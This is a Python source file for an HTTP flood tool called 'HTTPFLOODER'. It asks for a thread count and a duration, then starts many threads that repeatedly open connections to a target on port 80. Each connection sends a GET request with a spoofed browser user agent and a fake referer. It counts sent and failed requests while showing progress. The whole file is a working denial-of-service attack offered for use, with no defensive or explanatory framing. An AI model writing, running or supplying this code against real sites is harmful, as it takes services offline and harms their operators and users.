# -*- coding: utf-8 -*-

import socket
import sys
import time
import platform
from threading import Thread
from termcolor import colored
import os


threads = 0


def set_options(target, target_url):
    global threads
    global duration

    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

    print(colored("\nHTTPFLOODER", "yellow"))

    while True:
        try:
            threads = int(input("Threads > "))
            duration = int(input("Duration > "))
            break
        except:
            print(colored("Wrong input!", "red"))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((target, 80))
        print(colored("[*]","green") + "SUCCESSFULLY CONNECTED!")
        print("[*]STARTING...")
    except:
        print(colored("[-]", "red") + "ERROR: Host is unreachable...")
    else:
        start_attack(target, target_url, duration)

req = 0
err = 0


def run(host, url):
    request = "GET /" + url + " HTTP/1.1\n" \
                              "Host: " + host + "\n" \
                                                "Connection: close\n" \
                                                "User-agent: Mozila/5.0 (Windows: U; Windows NT 5.1; fr; rv:1.8.1.3) " \
                                                "Gecko/20070309 firefox/2.0.0.3\n" \
                                                "Referer: http://google.com/\n" \
                                                "\n"

    while True:
        global req
        global err

        req += 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((host, 80))
            sock.send(request.encode())
        except:
            err += 1
        finally:
            sock.close()


def start_attack(target, target_url, duration):
    global threads

    prog = (duration * 60.0) / 100.0

    for i in range(threads):
        th = Thread(target=run, args=(target, target_url))
        th.daemon = True
        th.start()

    print(colored("[*]", "green") + "ALL THREADS ARE INITIALIZED")

    for j in range(101):
        try:
            time.sleep(prog)
            sys.stdout.write("\r\033[0m[*]COMPLETED: %d%%" % j)
            sys.stdout.flush()
        except KeyboardInterrupt:
            print("\n[\033[93m*\033[0m]EXIT...")
            exit(0)


    print("\nDone!")
    print("Total: " + str(req) + ", failed: " + str(err))
